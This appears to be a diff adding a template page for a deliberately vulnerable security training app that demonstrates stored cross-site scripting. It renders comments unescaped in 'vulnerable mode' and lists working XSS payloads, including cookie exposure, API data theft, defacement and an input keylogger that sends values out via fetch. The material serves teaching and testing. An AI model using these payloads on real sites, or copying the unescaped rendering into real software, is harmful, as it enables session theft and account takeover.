@@ -1,0 +1,76 @@
+{% extends "base.html" %}
+{% block title %}XSS — Stored{% endblock %}
+{% block content %}
+
+<h1 class="page-title">XSS — Stored</h1>
+<p class="page-subtitle">A03:2021 · Payload saved to database, fires on every page load — no victim interaction needed beyond browsing</p>
+
+<div class="mode-banner {{ 'safe' if safe else 'vuln' }}">
+  <span class="badge">{{ 'SAFE MODE' if safe else 'VULNERABLE' }}</span>
+  {% if safe %}Comment body encoded before storage — tags rendered as text.
+  {% else %}Raw comment stored and rendered — script executes for every visitor.{% endif %}
+  <button onclick="toggleSafe()" class="btn {{ 'btn-red' if safe else 'btn-green' }}" style="margin-left:auto;font-size:11px;padding:0.3rem 0.8rem;">Switch to {{ 'Vulnerable' if safe else 'Safe' }} Mode</button>
+</div>
+
+<div class="split">
+  <div>
+    <div class="card">
+      <div class="card-header"><span>💬</span><span class="card-title">Leave a Comment</span></div>
+      <form method="POST" action="/xss/stored?safe={{ '1' if safe else '0' }}">
+        <div class="form-group">
+          <label class="form-label">Name</label>
+          <input name="author" class="form-input" placeholder="Your name">
+        </div>
+        <div class="form-group">
+          <label class="form-label">Comment</label>
+          <textarea name="body" class="form-input" rows="3" placeholder="<script>alert(document.cookie)</script>" style="resize:vertical;"></textarea>
+        </div>
+        <button type="submit" class="btn btn-green">Post Comment →</button>
+      </form>
+    </div>
+
+    <div class="card">
+      <div class="card-header"><span>📋</span><span class="card-title">Comments</span></div>
+      {% if comments %}
+        {% for c in comments %}
+        <div style="border-bottom:1px solid var(--border);padding:0.75rem 0;{% if loop.last %}border-bottom:none;{% endif %}">
+          <div style="display:flex;justify-content:space-between;margin-bottom:0.35rem;">
+            <strong style="color:var(--yellow);font-size:12px;">{{ c.author }}</strong>
+            <span style="font-size:10px;color:var(--gray);">{{ c.created_at }}</span>
+          </div>
+          <div style="font-size:13px;">{% if safe %}{{ c.body }}{% else %}{{ c.body | safe }}{% endif %}</div>
+        </div>
+        {% endfor %}
+      {% else %}
+        <div style="color:var(--gray);font-size:12px;">No comments yet.</div>
+      {% endif %}
+    </div>
+  </div>
+
+  <div>
+    <div class="card">
+      <div class="card-header"><span>💡</span><span class="card-title">Attack Payloads</span></div>
+      <div style="font-size:12px;color:var(--gray);margin-bottom:0.75rem;">Paste these into the comment body in vulnerable mode:</div>
+
+      {% set payloads = [
+        ("<script>alert('XSS by '+document.domain)</script>", "Basic stored XSS"),
+        ("<script>fetch('http://localhost:5000/api/users').then(r=>r.json()).then(d=>alert(JSON.stringify(d[0])))</script>", "Steal API data"),
+        ("<img src=x onerror=\"document.body.style.background='red'\">", "Page defacement"),
+        ("<script>document.querySelectorAll('input').forEach(i=>i.addEventListener('change',e=>fetch('//log?k='+e.target.value)))</script>", "Keylogger via XSS"),
+      ] %}
+
+      {% for payload, desc in payloads %}
+      <div style="background:#010409;border:1px solid var(--border);border-radius:5px;padding:0.6rem 0.8rem;margin-bottom:0.5rem;">
+        <code style="font-size:10.5px;color:var(--red);word-break:break-all;">{{ payload | e }}</code>
+        <div style="font-size:10px;color:var(--gray);margin-top:4px;">{{ desc }}</div>
+      </div>
+      {% endfor %}
+
+      <div class="alert alert-warn" style="margin-top:1rem;">
+        <strong>Why it's dangerous:</strong> Stored XSS fires for every visitor. Admin visits the page → attacker has admin's session cookie → full account takeover without admin doing anything suspicious.
+      </div>
+    </div>
+  </div>
+</div>
+
+{% endblock %}
